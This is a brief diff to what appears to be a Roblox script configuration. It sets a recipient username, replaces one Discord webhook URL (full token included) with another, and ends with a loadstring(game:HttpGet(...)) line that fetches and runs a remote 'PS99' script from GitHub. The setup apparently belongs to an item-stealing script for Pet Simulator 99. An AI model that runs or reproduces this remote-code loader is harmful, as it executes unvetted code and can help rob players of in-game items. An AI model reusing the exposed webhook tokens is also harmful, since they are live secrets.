@@ -1,5 +1,5 @@
 Username = "nekitapro8728"
 Username2 = "nekitapro8728"
-Webhook = "https://discord.com/api/webhooks/1320806880330911757/YZ_ZH0crF_eRj9a7G5ZElJTKccY8o-BJTZZIqYH3W2ANO6R4P6i1F8qfMpNqa5Ra6hqG"
+Webhook = "https://discord.com/api/webhooks/1333770746266124359/w-rYmIwFA8-daCgICl5_9Vi4lHM_6VnEBYda2BeWEuOwc_Zh9djcWQW8Y32_bDgPwp6M"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
